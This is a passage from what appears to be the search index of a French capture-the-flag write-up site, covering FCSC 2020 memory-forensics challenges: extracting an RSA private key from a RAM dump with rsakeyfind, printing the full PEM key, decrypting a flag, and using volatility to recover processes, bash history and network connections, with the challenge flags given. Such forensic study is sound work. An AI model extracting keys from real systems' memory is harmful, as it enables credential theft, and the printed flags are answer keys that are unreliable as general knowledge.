passphrase for key '/home/Lesage/.ssh/id_rsa': (standard input):1788358:Enter passphrase for key '/home/Lesage/.ssh/id_rsa': (standard input):2191305:h/id_rsa (standard input):2441815:/id_rsa' (standard input):3498355:Enter passphrase for key '/home/Lesage/.ssh/id_rsa': Et si volatility ne suffisait pas ?","title":"\u00c9tape 1 - Recherche d'une cl\u00e9 avec volatility"},{"location":"ctf/fcsc2020/administration/#etape-2-rsakeyfind","text":"Je d\u00e9couvre en cherchant sur notre bon vieux google, un outil, rsakeyfind. Il existe dans les d\u00e9pot debian, le nom est plutot attirant, et en plus il prend en entrer un dump m\u00e9moire... Wow, magique, il nous trouve deux cl\u00e9s. onosh@kali:/home/onosh/FCSC/FORENSIC# rsakeyfind dmp/dmp.mem FOUND PRIVATE KEY AT c64ac50 version = 00 modulus = 00 d7 1e 77 82 8c 92 31 e7 69 02 a2 d5 5c 78 de a2 0c 8f fe 28 59 31 df 40 9c 60 61 06 b9 2f 62 40 80 76 cb 67 4a b5 59 56 69 17 07 fa f9 4c bd 6c 37 7a 46 7d 70 a7 67 22 b3 4d 7a 94 c3 ba 4b 7c 4b a9 32 7c b7 38 95 45 64 a4 05 a8 9f 12 7c 4e c6 c8 2d 40 06 30 f4 60 a6 91 bb 9b ca 04 79 11 13 75 f0 ae d3 51 89 c5 74 b9 aa 3f b6 83 e4 78 6b cd f9 5c 4c 85 ea 52 3b 51 93 fc 14 6b 33 5d 30 70 fa 50 1b 1b 38 81 13 8d f7 a5 0c c0 8e f9 63 52 18 4e a9 f9 f8 5c 5d cd 7a 0d d4 8e 7b ee 91 7b ad 7d b4 92 d5 ab 16 3b 0a 8a ce 8e de 47 1a 17 01 86 7b ab 99 f1 4b 0c 3a 0d 82 47 c1 91 8c bb 2e 22 9e 49 63 6e 02 c1 c9 3a 9b a5 22 1b 07 95 d6 10 02 50 fd fd d1 9b be ab c2 c0 74 d7 ec 00 fb 11 71 cb 7a dc 81 79 9f 86 68 46 63 82 4d b7 f1 e6 16 6f 42 63 f4 94 a0 ca 33 cc 75 13 publicExponent = 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 01 privateExponent = 62 b5 60 31 4f 3f 66 16 c1 60 ac 47 2a ff 6b 69 00 4a b2 5c e1 50 b9 18 74 a8 e4 dc a8 ec cd 30 bb c1 c6 e3 c6 ac 20 2a 3e 5e 8b 12 e6 82 08 09 38 0b ab 7c b3 cc 9c ce 97 67 dd ef 95 40 4e 92 e2 44 e9 1d c1 14 fd a9 b1 dc 71 9c 46 21 bd 58 88 6e 22 15 56 c1 ef e0 c9 8d e5 80 3e da 7e 93 0f 52 f6 f5 c1 91 90 9e 42 49 4f 8d 9c ba 38 83 e9 33 c2 50 4f ec c2 f0 a8 b7 6e 28 25 56 6b 62 67 fe 08 f1 56 e5 6f 0e 99 f1 e5 95 7b ef eb 0a 2c 92 97 57 23 33 36 07 dd fb ae f1 b1 d8 33 b7 96 71 42 36 c5 a4 a9 19 4b 1b 52 4c 50 69 91 f0 0e fa 80 37 4b b5 d0 2f b7 44 0d d4 f8 39 8d ab 71 67 59 05 88 3d eb 48 48 33 88 4e fe f8 27 1b d6 55 60 5e 48 b7 6d 9a a8 37 f9 7a de 1b cd 5d 1a 30 d4 e9 9e 5b 3c 15 f8 9c 1f da d1 86 48 55 ce 83 ee 8e 51 c7 de 32 12 47 7d 46 b8 35 df 41 prime1 = 00 prime2 = 00 exponent1 = 00 exponent2 = 00 coefficient = 00 FOUND PRIVATE KEY AT 1084c490 version = 00 modulus = 00 d7 1e 77 82 8c 92 31 e7 69 02 a2 d5 5c 78 de a2 0c 8f fe 28 59 31 df 40 9c 60 61 06 b9 2f 62 40 80 76 cb 67 4a b5 59 56 69 17 07 fa f9 4c bd 6c 37 7a 46 7d 70 a7 67 22 b3 4d 7a 94 c3 ba 4b 7c 4b a9 32 7c b7 38 95 45 64 a4 05 a8 9f 12 7c 4e c6 c8 2d 40 06 30 f4 60 a6 91 bb 9b ca 04 79 11 13 75 f0 ae d3 51 89 c5 74 b9 aa 3f b6 83 e4 78 6b cd f9 5c 4c 85 ea 52 3b 51 93 fc 14 6b 33 5d 30 70 fa 50 1b 1b 38 81 13 8d f7 a5 0c c0 8e f9 63 52 18 4e a9 f9 f8 5c 5d cd 7a 0d d4 8e 7b ee 91 7b ad 7d b4 92 d5 ab 16 3b 0a 8a ce 8e de 47 1a 17 01 86 7b ab 99 f1 4b 0c 3a 0d 82 47 c1 91 8c bb 2e 22 9e 49 63 6e 02 c1 c9 3a 9b a5 22 1b 07 95 d6 10 02 50 fd fd d1 9b be ab c2 c0 74 d7 ec 00 fb 11 71 cb 7a dc 81 79 9f 86 68 46 63 82 4d b7 f1 e6 16 6f 42 63 f4 94 a0 ca 33 cc 75 13 publicExponent = 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 01 privateExponent = 62 b5 60 31 4f 3f 66 16 c1 60 ac 47 2a ff 6b 69 00 4a b2 5c e1 50 b9 18 74 a8 e4 dc a8 ec cd 30 bb c1 c6 e3 c6 ac 20 2a 3e 5e 8b 12 e6 82 08 09 38 0b ab 7c b3 cc 9c ce 97 67 dd ef 95 40 4e 92 e2 44 e9 1d c1 14 fd a9 b1 dc 71 9c 46 21 bd 58 88 6e 22 15 56 c1 ef e0 c9 8d e5 80 3e da 7e 93 0f 52 f6 f5 c1 91 90 9e 42 49 4f 8d 9c ba 38 83 e9 33 c2 50 4f ec c2 f0 a8 b7 6e 28 25 56 6b 62 67 fe 08 f1 56 e5 6f 0e 99 f1 e5 95 7b ef eb 0a 2c 92 97 57 23 33 36 07 dd fb ae f1 b1 d8 33 b7 96 71 42 36 c5 a4 a9 19 4b 1b 52 4c 50 69 91 f0 0e fa 80 37 4b b5 d0 2f b7 44 0d d4 f8 39 8d ab 71 67 59 05 88 3d eb 48 48 33 88 4e fe f8 27 1b d6 55 60 5e 48 b7 6d 9a a8 37 f9 7a de 1b cd 5d 1a 30 d4 e9 9e 5b 3c 15 f8 9c 1f da d1 86 48 55 ce 83 ee 8e 51 c7 de 32 12 47 7d 46 b8 35 df 41 prime1 = 00 prime2 = 00 exponent1 = 00 exponent2 = 00 coefficient = 00 La premi\u00e8re ne fonctionne pas, je test la deuxi\u00e8me avec ce petit script : from Crypto.PublicKey import RSA modulus = '00d71e77828c9231e76902a2d55c78dea20c8ffe285931df409c606106b92f62408076cb674ab55956691707faf94cbd6c377a467d70a76722b34d7a94c3ba4b7c4ba9327cb738954564a405a89f127c4ec6c82d400630f460a691bb9bca0479111375f0aed35189c574b9aa3fb683e4786bcdf95c4c85ea523b5193fc146b335d3070fa501b1b3881138df7a50cc08ef96352184ea9f9f85c5dcd7a0dd48e7bee917bad7db492d5ab163b0a8ace8ede471a1701867bab99f14b0c3a0d8247c1918cbb2e229e49636e02c1c93a9ba5221b0795d6100250fdfdd19bbeabc2c074d7ec00fb1171cb7adc81799f86684663824db7f1e6166f4263f494a0ca33cc7513' publicExponent = '10001' privateExponent = '62b560314f3f6616c160ac472aff6b69004ab25ce150b91874a8e4dca8eccd30bbc1c6e3c6ac202a3e5e8b12e6820809380bab7cb3cc9cce9767ddef95404e92e244e91dc114fda9b1dc719c4621bd58886e221556c1efe0c98de5803eda7e930f52f6f5c191909e42494f8d9cba3883e933c2504fecc2f0a8b76e2825566b6267fe08f156e56f0e99f1e5957befeb0a2c92975723333607ddfbaef1b1d833b796714236c5a4a9194b1b524c506991f00efa80374bb5d02fb7440dd4f8398dab71675905883deb484833884efef8271bd655605e48b76d9aa837f97ade1bcd5d1a30d4e99e5b3c15f89c1fdad1864855ce83ee8e51c7de3212477d46b835df41' modulus_int = long(modulus,16) publicExponent_int = long(publicExponent, 16) privateExponent_int = long(privateExponent, 16) private_key = RSA.construct((modulus_int, publicExponent_int, privateExponent_int)) pem_key = private_key.exportKey('PEM') print(pem_key) Il me resors gentiment une cl\u00e9 priv\u00e9 : -----BEGIN RSA PRIVATE KEY----- MIIEpQIBAAKCAQEA1x53goySMedpAqLVXHjeogyP/ihZMd9AnGBhBrkvYkCAdstn SrVZVmkXB/r5TL1sN3pGfXCnZyKzTXqUw7pLfEupMny3OJVFZKQFqJ8SfE7GyC1A BjD0YKaRu5vKBHkRE3XwrtNRicV0uao/toPkeGvN+VxMhepSO1GT/BRrM10wcPpQ Gxs4gRON96UMwI75Y1IYTqn5+FxdzXoN1I577pF7rX20ktWrFjsKis6O3kcaFwGG e6uZ8UsMOg2CR8GRjLsuIp5JY24Cwck6m6UiGweV1hACUP390Zu+q8LAdNfsAPsR cct63IF5n4ZoRmOCTbfx5hZvQmP0lKDKM8x1EwIDAQABAoIBAGK1YDFPP2YWwWCs Ryr/a2kASrJc4VC5GHSo5Nyo7M0wu8HG48asICo+XosS5oIICTgLq3yzzJzOl2fd 75VATpLiROkdwRT9qbHccZxGIb1YiG4iFVbB7+DJjeWAPtp+kw9S9vXBkZCeQklP jZy6OIPpM8JQT+zC8Ki3biglVmtiZ/4I8Vblbw6Z8eWVe+/rCiySl1cjMzYH3fuu 8bHYM7eWcUI2xaSpGUsbUkxQaZHwDvqAN0u10C+3RA3U+DmNq3FnWQWIPetISDOI Tv74JxvWVWBeSLdtmqg3+XreG81dGjDU6Z5bPBX4nB/a0YZIVc6D7o5Rx94yEkd9 Rrg130ECgYEA5Eyu3hb9n4NVW4RKzxzxN5Wtyil/LW4ygaQrJhSWHUAF7AyvPyxv LOi/He7Qs+98W56ITyqLDkq9t4z6EA472mitQSvklvp/gFJfB58OO16WRRoTK5TO HwdphTX8aWNb+Pg/zp1AHnyt+57O4AH471ld3AB5q4o/gKJ2MpSp6mUCgYEA8Thg kA0MLj005ZDqIUMfaGMWeyWN3oIrUvij/Q855+leMnUVfdDJzgbl+6nLIuXbSQny 5relp3UukS0rXfFIYUVD1738EXO1EZ+yGDpvNqfC0xhN8MUfcIybxR2VqFqejLFL aiqEdizYT0ewgYQCRfCF+AxtpwxNLLJbgXD9bhcCgYEAjQfF+pJPSMvT3f4CTKF/ bav8OOeblc/+SVHGCfcrqJQVVHWdiLQFVcPN1ErkCFPICb0MTYNldYW8XvgqveJd HRYO+TSJOK80NmwsIkQigZBz2eo6r3B0SHzGtbDc5amodku89wDzTCIPRGIdQApX 4lvdfHuardpwUiGKTMLDmHUCgYEA7SRcoiGBoQ+hKjMOSccAYJJRbp2b3G0iBH7W URmf9uORLI+4oikZzEcx3/ir8NICg8qZFsLiwz9LmYPLh56GZsI+kSGAZvPWxc22 u2TvIs9IlFjnftV8NBy3otCT6Z+1EWHXXzcPZFJwEXjMCHfr+DAetJ4bSseoM1Hg 7d9T9t8CgYEAhtlM7mVhwRmp1XSb1cr2gysGtCD+RSno4/rhTyiOYy90wzpcmvWe Dg3F/qBMAM57pBkXWa8TOgOPVPVgOS7ZBrN81pAGQXfzk+F6AUHBj/5MiDnb3nGe WNFJUICyWk9pi7j+Y9RCPTdhqEz/tplM9FHgRKppeT+BpGE9JukEUmQ= -----END RSA PRIVATE KEY----- J'essaye de d\u00e9chiffrer le fichier avec la cl\u00e9 trouv\u00e9e : onosh@kali:/home/onosh/FCSC/FORENSIC/rsakeyfind-master# openssl rsautl -decrypt -inkey THEKEY.txt -in flag.txt.enc -out flag.txt && cat flag.txt FCSC{ac5cad66114d4866a4b55e43cb8896cc4947855241b5af8d2f8a123c36083d98}","title":"\u00c9tape 2 - RSAKEYFIND"},{"location":"ctf/fcsc2020/artefacts/","text":"Acad\u00e9mie de l'investigation - Premiers art\u00e9facts \u00c9nonc\u00e9 Pour avancer dans l'analyse, vous devez retrouver : Le nom de processus ayant le PID 1254. La commande exacte qui a \u00e9t\u00e9 ex\u00e9cut\u00e9e le 2020-03-26 23:29:19 UTC. Le nombre d'IP-DST unique en communications TCP \u00e9tablies (\u00e9tat ESTABLISHED) lors du dump. Format du flag : FCSC{nom_du_processus:une_commande:n} dmp.tar.gz \u00c9tape 1 - Cr\u00e9ation du profil volatility Il faut absolument cr\u00e9er un profil volatility linux pour ce challenge. La version du kernel doit \u00eatre respect\u00e9 sinon cela ne fonctionne pas. Commen\u00e7ons par installer une VM debian 9, l'iso est ici Une fois que debian fonctionne, regardez votre version kernel, ici on est en 4.9.0-12-amd64, donc c'est pas bon, il nous faut la 5.4.0-4-amd64 pour le challenge. root@writeup:~# uname -a Linux writeup 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux J'ai travaill\u00e9 avec le d\u00e9p\u00f4t suivant, \u00e0 vous de trouver un d\u00e9p\u00f4t qui correspond \u00e0 votre besoin en fonction de votre version de kernel pour votre analyse. http://repo.puri.sm/pureos/pool/main/l/linux/ On installe les headers : wget http://repo.puri.sm/pureos/pool/main/l/linux/linux-headers-5.4.0-4-amd64_5.4.19-1_amd64.deb dpkg -i linux-headers-5.4.0-4-amd64_5.4.19-1_amd64.deb Oui on va avoir besoin de toutes les d\u00e9pendances :( root@writeup:~# dpkg -i linux-headers-5.4.0-4-amd64_5.4.19-1_amd64.deb S\u00e9lection du paquet linux-headers-5.4.0-4-amd64 pr\u00e9c\u00e9demment d\u00e9s\u00e9lectionn\u00e9. (Lecture de la base de donn\u00e9es... 21588 fichiers et r\u00e9pertoires d\u00e9j\u00e0 install\u00e9s.) Pr\u00e9paration du d\u00e9paquetage de linux-headers-5.4.0-4-amd64_5.4.19-1_amd64.deb ... D\u00e9paquetage de linux-headers-5.4.0-4-amd64 (5.4.19-1) ... dpkg: des probl\u00e8mes de d\u00e9pendances emp\u00eachent la configuration de linux-headers-5.4.0-4-amd64 : linux-headers-5.4.0-4-amd64 d\u00e9pend de linux-headers-5.4.0-4-common (= 5.4.19-1) ; cependant : Le paquet linux-headers-5.4.0-4-common n'est pas install\u00e9. linux-headers-5.4.0-4-amd64 d\u00e9pend de linux-kbuild-5.4 (>= 5.4.19-1) ; cependant : Le paquet linux-kbuild-5.4 n'est pas install\u00e9. linux-headers-5.4.0-4-amd64 d\u00e9pend de linux-compiler-gcc-9-x86 ; cependant : Le paquet linux-compiler-gcc-9-x86 n'est pas install\u00e9. dpkg: erreur de traitement du paquet linux-headers-5.4.0-4-amd64 (--install) : probl\u00e8mes de d\u00e9pendances - laiss\u00e9 non configur\u00e9 Des erreurs ont \u00e9t\u00e9 rencontr\u00e9es pendant l'ex\u00e9cution : linux-headers-5.4.0-4-amd64 On annule l'installation du linux-headers-5.4.0-4-amd64_5.4.19-1_amd64.deb apt --fix-broken install On commence par installer le common wget http://repo.puri.sm/pureos/pool/main/l/linux/linux-headers-5.4.0-4-common_5.4.19-1_all.deb dpkg -i linux-headers-5.4.0-4-common_5.4.19-1_all.deb Puis le kbuild wget http://repo.puri.sm/pureos/pool/main/l/linux/linux-kbuild-5.4_5.4.19-1_amd64.deb dpkg -i linux-kbuild-5.4_5.4.19-1_amd64.deb Puis la bonne version de gcc wget http://repo.puri.sm/pureos/pool/main/l/linux/linux-compiler-gcc-9-x86_5.5.17-1_amd64.deb dpkg -i linux-compiler-gcc-9-x86_5.5.17-1_amd64.deb On relance l'installation du linux-headers dpkg -i linux-headers-5.4.0-4-amd64_5.4.19-1_amd64.deb On installe l'image wget http://repo.puri.sm/pureos/pool/main/l/linux/linux-image-5.4.0-4-amd64-dbg_5.4.19-1_amd64.deb dpkg -i linux-image-5.4.0-4-amd64-dbg_5.4.19-1_amd64.deb On reboot la machine, puis : root@writeup:~# uname -a Linux writeup 5.4.0-4-amd64 #1 SMP Debian 5.4.19-1 (2020-02-13) x86_64 GNU/Linux Normalement vous avez la bonne version de kernel maintenant. On installe rapidement volatility et on cr\u00e9er le profil : git clone https://github.com/volatilityfoundation/volatility.git apt install dwarfdump apt install build-essential cd volatility/tools/linux make head module.dwarf zip volatility/volatility/plugins/overlays/linux/fcscdebian.zip volatility/tools/linux/module.dwarf /boot/System.map-5.4.0-4-amd64 Vous pouvez maintenant faire l'analyse sur votre VM, ou sur votre machine de travail habituel en exportant le fichier fcscdebian.zip. Je vous le met \u00e0 disposition pour vous \u00e9pargnez : fcscdebian.zip \u00c9tape 2 - Recherche du processus 1254 Volatility propose le plugin linux_psxview pour voir l'ensemble des processus, m\u00eames cach\u00e9s. onosh@kali:/home/onosh/FCSC/FORENSIC/volatility# python vol.py -f ../dmp/dmp.mem --profile=Linuxfcscdebianx64 linux_psxview |grep 1254 Volatility Foundation Volatility Framework 2.6.1 0x000000003fdccd80 pool-xfconfd 1254 False True False False False False Le nom du processus est pool-xfconfd \u00c9tape 3 - La commande Volatility propose le plugin linux_bash pour afficher les commandes \u00e9x\u00e9cut\u00e9es onosh@kali:/home/onosh/FCSC/FORENSIC/volatility# python vol.py -f ../dmp/dmp.mem --profile=Linuxfcscdebianx64 linux_bash Volatility Foundation Volatility Framework 2.6.1 Pid Name Command Time Command -------- -------------------- ------------------------------ ------- 1523 bash 2020-03-26 23:24:18 UTC+0000 rm .bash_history 1523 bash 2020-03-26 23:24:18 UTC+0000 exit 1523 bash 2020-03-26 23:24:18 UTC+0000 vim /home/Lesage/.bash_history 1523 bash 2020-03-26 23:24:27 UTC+0000 ss -laupt 1523 bash 2020-03-26 23:26:06 UTC+0000 rkhunter -c 1523 bash 2020-03-26 23:29:19 UTC+0000 nmap -sS -sV 10.42.42.0/24 1523 bash 2020-03-26 23:31:31 UTC+0000 ?+??U 1523 bash 2020-03-26 23:31:31 UTC+0000 ip -c addr 1523 bash 2020-03-26 23:38:00 UTC+0000 swapoff -a 1523 bash 2020-03-26 23:38:05 UTC+0000 swapon -a 1523 bash 2020-03-26 23:40:18 UTC+0000 ls 1523 bash 2020-03-26 23:40:23 UTC+0000 cat LiME.txt 1523 bash 2020-03-26 23:40:33 UTC+0000 cd LiME/src/ 1523 bash 2020-03-26 23:40:54 UTC+0000 1523 bash 2020-03-26 23:40:54 UTC+0000 insmod lime-5.4.0-4-amd64.ko \"path=/dmp.mem format=lime timeout=0\" La commande exacte qui a \u00e9t\u00e9 ex\u00e9cut\u00e9e le 2020-03-26 23:29:19 UTC est nmap -sS -sV 10.42.42.0/24 \u00c9tape 4 - Le nombre d'IP-DST Volatility propose le plugin linux_netstat pour voir les connexions \u00e9tablies. En comptant \u00e0 la main : onosh@kali:/home/onosh/FCSC/FORENSIC/volatility# python vol.py -f ../dmp/dmp.mem --profile=Linuxfcscdebianx64 linux_netstat |grep 'ESTAB' Volatility Foundation Volatility Framework 2.6.1 TCP 10.42.42.131 :36970 116.203.52.118 : 443 ESTABLISHED tor/706 TCP 10.42.42.131 :37252 163.172.182.147 : 443 ESTABLISHED tor/706 TCP fd:6663:7363:1000:c10b:6374:25f:dc37:36280 fd:6663:7363:1000:55cf:b9c6:f41d:cc24:58014 ESTABLISHED ncat/1515 TCP 10.42.42.131 :47106 216.58.206.226 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :55224 151.101.121.140 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :55226 151.101.121.140 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :53190 104.124.192.89 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :45652 35.190.72.21 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :47102 216.58.206.226 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :47104 216.58.206.226 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :38186 216.58.213.142 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :47100 216.58.206.226 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :50612 104.93.255.199 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :58772 185.199.111.154 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :38184 216.58.213.142 : 443 ESTABLISHED chromium/119187 TCP 10.42.42.131 :57000 10.42.42.134 : 22 ESTABLISHED ssh/119468 TCP fd:6663:7363:1000:c10b:6374:25f:dc37:36280 fd:6663:7363:1000:55cf:b9c6:f41d:cc24:58014 ESTABLISHED sh/119511 TCP 127.0.0.1 :38498 127.0.0.1 :34243 ESTABLISHED cli/119514 TCP 127.0.0.1 :34243 127.0.0.1 :38498 ESTABLISHED cli/119514 TCP 10.42.42.131 :51858 10.42.42.128 : 445 ESTABLISHED smbclient/119577 En one line : onosh@kali:/home/onosh/FCSC/FORENSIC/volatility# python vol.py -f ../dmp/dmp.mem --profile=Linuxfcscdebianx64 linux_netstat |grep 'ESTAB' |awk -F' ' '{print $4}' |sort |uniq -c |wc -l 13 Nous avons 13 IPs destinations au total. Le flag : FCSC{pool-xfconfd:nmap -sS -sV 10.42.42.0/24:13}","title":"2. Artefacts"},{"location":"ctf/fcsc2020/artefacts/#academie-de-linvestigation-premiers-artefacts","text":"","title":"Acad\u00e9mie de l'investigation - Premiers art\u00e9facts"},{"location":"ctf/fcsc2020/artefacts/#enonce","text":"Pour avancer dans l'analyse, vous devez retrouver : Le nom de processus ayant le PID 1254. La commande exacte qui a \u00e9t\u00e9 ex\u00e9cut\u00e9e le 2020-03-26 23:29:19 UTC. Le nombre d'IP-DST unique en communications TCP \u00e9tablies (\u00e9tat ESTABLISHED) lors du dump. Format du flag : FCSC{nom_du_processus:une_commande:n} dmp.tar.gz","title":"\u00c9nonc\u00e9"},{"location":"ctf/fcsc2020/artefacts/#etape-1-creation-du-profil-volatility","text":"Il faut absolument cr\u00e9er un profil volatility linux pour ce challenge. La version du kernel doit \u00eatre respect\u00e9 sinon cela ne fonctionne pas. Commen\u00e7ons par installer une VM debian 9, l'iso est ici Une fois que debian fonctionne, regardez votre version kernel, ici on est en 4.9.0-12-amd64, donc c'est pas bon, il nous faut la 5.4.0-4-amd64 pour le challenge. root@writeup:~# uname -a Linux writeup 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1 (2020-01-20) x86_64 GNU/Linux J'ai travaill\u00e9 avec le d\u00e9p\u00f4t suivant, \u00e0 vous de trouver un d\u00e9p\u00f4t qui correspond \u00e0 votre besoin en fonction de votre version de kernel pour votre analyse. http://repo.puri.sm/pureos/pool/main/l/linux/ On installe les headers : wget http://repo.puri.sm/pureos/pool/main/l/linux/linux-headers-5.4.0-4-amd64_5.4.19-1_amd64.deb dpkg -i linux-headers-5.4.0-4-amd64_5.4.19-1_amd64.deb Oui on va avoir besoin de toutes les d\u00e9pendances :( root@writeup:~# dpkg -i linux-headers-5.4.0-4-amd64_5.4.19-1_amd64.deb S\u00e9lection du paquet linux-headers-5.4.0-4-amd64 pr\u00e9c\u00e9demment d\u00e9s\u00e9lectionn\u00e9. (Lecture de la base de donn\u00e9es... 21588 fichiers et r\u00e9pertoires d\u00e9j\u00e0 install\u00e9s.) Pr\u00e9paration du d\u00e9paquetage de linux-headers-5.4.0-4-amd64_5.4.19-1_amd64.deb ... D\u00e9paquetage de linux-headers-5.4.0-4-amd64 (5.4.19-1) ... dpkg: des probl\u00e8mes de d\u00e9pendances emp\u00eachent la configuration de linux-headers-5.4.0-4-amd64 : linux-headers-5.4.0-4-amd64 d\u00e9pend de linux-headers-5.4.0-4-common (= 5.4.19-1) ; cependant : Le paquet linux-headers-5.4.0-4-common n'est pas install\u00e9. linux-headers-5.4.0-4-amd64 d\u00e9pend de linux-kbuild-5.4 (>= 5.4.19-1) ; cependant : Le paquet linux-kbuild-5.4 n'est pas install\u00e9. linux-headers-5.4.0-4-amd64 d\u00e9pend de linux-compiler-gcc-9-x86 ; cependant : Le paquet linux-compiler-gcc-9-x86 n'est pas install\u00e9. dpkg: erreur de traitement du paquet linux-headers-5.4.0-4-amd64 (--install) : probl\u00e8mes de d\u00e9pendances - laiss\u00e9 non configur\u00e9 Des erreurs ont \u00e9t\u00e9 rencontr\u00e9es pendant l'ex\u00e9cution : linux-headers-5.4.0-4-amd64 On annule l'installation du linux-headers-5.4.0-4-amd64_5.4.19-1_amd64.deb apt --fix-broken install On commence par installer le common wget http://repo.puri.sm/pureos/pool/main/l/linux/linux-headers-5.4.0-4-common_5.4.19-1_all.deb dpkg -i linux-headers-5.4.0-4-common_5.4.19-1_all.deb Puis le kbuild wget http://repo.puri.sm/pureos/pool/main/l/linux/linux-kbuild-5.4_5.4.19-1_amd64.deb dpkg -i linux-kbuild-5.4_5.4.19-1_amd64.deb Puis la bonne version de gcc wget http://repo.puri.sm/pureos/pool/main/l/linux/linux-compiler-gcc-9-x86_5.5.17-1_amd64.deb dpkg -i linux-compiler-gcc-9-x86_5.5.17-1_amd64.deb On relance l'installation du linux-headers dpkg -i linux-headers-5.4.0-4-amd64_5.4.19-1_amd64.deb On installe l'image wget http://repo.puri.sm/pureos/pool/main/l/linux/linux-image-5.4.0-4-amd64-dbg_5.4.19-1_amd64.deb dpkg -i linux-image-5.4.0-4-amd64-dbg_5.4.19-1_amd64.deb On reboot la machine, puis : root@writeup:~# uname -a Linux writeup 5.4.0-4-amd64 #1 SMP Debian 5.4.19-1 (2020-02-13) x86_64 GNU/Linux Normalement vous avez la bonne version de kernel maintenant. On installe rapidement volatility et on cr\u00e9er le profil : git clone https://github.com/volatilityfoundation/volatility.git apt install dwarfdump apt install build-essential cd volatility/tools/linux make head module.dwarf zip volatility/volatility/plugins/overlays/linux/fcscdebian.zip volatility/tools/linux/module.dwarf /boot/System.map-5.4.0-4-amd64 Vous pouvez maintenant faire l'analyse sur votre VM, ou sur votre machine de travail habituel en exportant le fichier fcscdebian.zip. Je vous le met \u00e0 disposition pour vous \u00e9pargnez : fcscdebian.zip","title":"\u00c9tape 1 - Cr\u00e9ation du profil volatility"},{"location":"ctf/fcsc2020/artefacts/#etape-2-recherche-du-processus-1254","text":"Volatility propose le plugin linux_psxview pour voir l'ensemble des processus, m\u00eames cach\u00e9s. onosh@kali:/home/onosh/FCSC/FORENSIC/volatility# python vol.py -f ../dmp/dmp.mem --profile=Linuxfcscdebianx64 linux_psxview |grep 1254 Volatility Foundation Volatility Framework 2.6.1 0x000000003fdccd80 pool-xfconfd 1254 False True False False False False Le nom du processus est pool-xfconfd","title":"\u00c9tape 2 - Recherche du processus 1254"},{"location":"ctf/fcsc2020/artefacts/#etape-3-la-commande","text":"Volatility propose le plugin linux_bash pour afficher les commandes \u00e9x\u00e9cut\u00e9es onosh@kali:/home/onosh/FCSC/FORENSIC/volatility# python vol.py -f ../dmp/dmp.mem --profile=Linuxfcscdebianx64 linux_bash Volatility Foundation Volatility Framework 2.6.1 Pid Name Command Time Command -------- -------------------- ------------------------------ ------- 1523 bash 2020-03-26 23:24:18 UTC+0000 rm .bash_history 1523 bash 2020-03-26 23:24:18 UTC+0000 exit 1523 bash 2020-03-26 23:24:18 UTC+0000 vim /home/Lesage/.bash_history 1523 bash 2020-03-26 23:24:27 UTC+0000 ss -laupt 1523 bash 2020-03-26 23:26:06 UTC+0000 rkhunter -c 1523 bash 2020-03-26 23:29:19 UTC+0000 nmap -sS -sV 10.42.42.0/24 1523 bash 2020-03-26 23:31:31 UTC+0000 ?+??U 1523 bash 2020-03-26 23:31:31 UTC+0000 ip -c addr 1523 bash 2020-03-26 23:38:00 UTC+0000 swapoff -a 1523 bash 2020-03-26 23:38:05 UTC+0000 swapon -a 1523 bash 2020-03-26 23:40:18 UTC+0000 ls 1523 bash 2020-03-26 23:40:23 UTC+0000 cat LiME.txt 1523 bash 2020-03-26 23:40:33 UTC+0000 cd LiME/src/ 1523 bash 2020-03-26 23:40:54 UTC+0000 1523 bash 2020-03-26 23:40:54 UTC+0000 insmod lime-5.4.0-4-amd64.ko \"path=/dmp.mem format=lime timeout=0\" La commande exacte qui a \u00e9t\u00e9 ex\u00e9cut\u00e9e le 2020-03-26 23:29:19 UTC est nmap -sS -sV 10.42.42.0/24","title":"\u00c9tape 3 - La commande"},{"location":"ctf/fcsc2020/artefacts/#etape-4-le-nombre-dip-dst","text":"Volatility propose le plugin linux_netstat pour voir les connexions \u00e9tablies. En comptant \u00e0 la main : 